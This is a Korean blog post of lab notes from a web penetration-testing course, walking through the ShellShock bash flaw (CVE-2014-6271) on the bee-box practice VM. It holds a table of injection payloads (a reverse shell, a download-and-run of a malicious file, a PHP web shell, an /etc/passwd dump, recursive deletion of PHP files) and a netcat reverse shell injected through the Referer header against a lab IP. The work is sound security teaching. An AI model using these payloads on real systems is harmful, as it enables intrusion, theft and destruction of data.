---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - 셀쇼크 취약점(CVE-2014-6271)"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part9 A9
  - 알려진 취약점이 있는 컴포넌트 사용
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 25강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## ShellShock 취약점 (CVE-2014-6271)

![image](https://user-images.githubusercontent.com/28076542/53467152-42b35600-3a98-11e9-9ff0-0f6b86f75ecf.png)

* 예전 bash를 쓰는 운영체제는 모두 발생하는 취약점

## ShellShock 취약점 분석

* 환경 변수와 함께 선언되는 함수 선언과 명령어 삽입
* **함수가 아닌** 일반 환경 변수가 `() { <함수 body> }; <공격하려는 코드>`일 때 child로 생성된 Bash shell에서 함수로 인식되는 버그
* [참고 자료](https://namu.wiki/w/%EC%85%B8%EC%87%BC%ED%81%AC)

![image](https://user-images.githubusercontent.com/28076542/53467205-89a14b80-3a98-11e9-849a-5a87137cdab2.png)

## 패치 적용된 칼리리눅스와 적용 안 된 Bee-Box 비교

### 칼리리눅스

```bash
root@ming:~# env var='() { :;}; echo 1234' bash -c "echo test"
test
```

### Bee-Box

```bash
bee@bee-box:~$ env var='() { :;}; echo 1234' bash -c "echo test"
1234
test
```

## ShellShock 취약점 Exploit 페이로드

* `() { :;}; 삽입 명령어`

|공격|삽입 명령어|
|:----:|:----:|
|리버스 셸 연결|`/bin/bash -i > /dev/tcp/localhost/8081 0>&1`|
|악성파일 다운|`wget -O /tmp/syslogd http://localhost/prog; chmod 777 /tmp/syslogd; /tmp/syslogd;`|
|시스템 상태 체크|`/bin/ping -c localhost`|
|계정 탈취|`/bin/cat /etc/passwd > dumped_file`|
|웹 셸 생성|`echo \"<? \\$cmd = \\$_REQUEST[\\\"cmd\\\"]; if(\\$cmd != \\\"\\\") print Shell_Exec(\\$cmd;?>\" > ../../p.php& o`|
|시스템 재시작|`/bin/bash -c \"reboot\"`|
|PHP 소스 삭제|`find / -name *.php | xargs rm -rf`|

---

## Shellshock Vulnerability (CGI)

![image](https://user-images.githubusercontent.com/28076542/53469516-9c6c4e00-3aa1-11e9-8d07-5d7a8024d374.png)

```bash
bee@bee-box:/usr/bin$ ls -l php5-cgi
-rw-r--r-- 1 root root 5482364 2008-02-27 21:50 php5-cgi
bee@bee-box:/usr/bin$ sudo chmod 755 php5-cgi
[sudo] password for bee: 
bee@bee-box:/usr/bin$ ls -l php5-cgi
-rwxr-xr-x 1 root root 5482364 2008-02-27 21:50 php5-cgi
```

* 우선 Bee-Box에서 php5-cgi 파일에 실행 권한을 줌

### 1. BurpSuite 프록시 잡기

![image](https://user-images.githubusercontent.com/28076542/53470027-96776c80-3aa3-11e9-8d98-08d84a72ebd6.png)

* 한 번 forward 해주면 뒤에 referer가 달린 GET 요청이 또 나옴

### 2. 칼리리눅스 아이피 확인 및 8888 포트 열기

```bash
root@ming:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.190.155  netmask 255.255.255.0  broadcast 192.168.190.255
        inet6 fe80::20c:29ff:fe1d:546c  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:1d:54:6c  txqueuelen 1000  (Ethernet)
        RX packets 54529  bytes 38260116 (36.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26738  bytes 4522044 (4.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24137  bytes 7619271 (7.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24137  bytes 7619271 (7.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@ming:~# nc -lvp 8888
listening on [any] 8888 ...
```

### 3. Repeater로 넘긴 후 Referer 수정

![image](https://user-images.githubusercontent.com/28076542/53470899-68dff280-3aa6-11e9-9688-a0889088c1ae.png)

* Referer: `() { :;}; /bin/bash -c "nc 192.168.190.155 8888 -e /bin/bash"`
* 위 명령어에 들어가는 아이피는 칼리리눅스 아이피
* 웹에서 Referer는 터미널에서의 환경 변수처럼 작동하여 ShellShock 취약점이 발생되는 것 
* `nc 192.168.190.155 8888 -e /bin/bash")`: 아이피 주소 192.168.190.155, 포트 8888에 접속한 후 `/bin/bash`를 실행하여라 --> `-e`: execute

### 4. Go 버튼 누르고 칼리리눅스 터미널 확인

```bash
root@ming:~# nc -lvp 8888
listening on [any] 8888 ...
192.168.190.143: inverse host lookup failed: Unknown host
connect to [192.168.190.155] from (UNKNOWN) [192.168.190.143] 60736
whoami
www-data
```

* Referer말고 다른 부분에서도 ShellShock 코드를 삽입 가능하다고 함 --> [참고](https://blog.cloudflare.com/inside-shellshock/)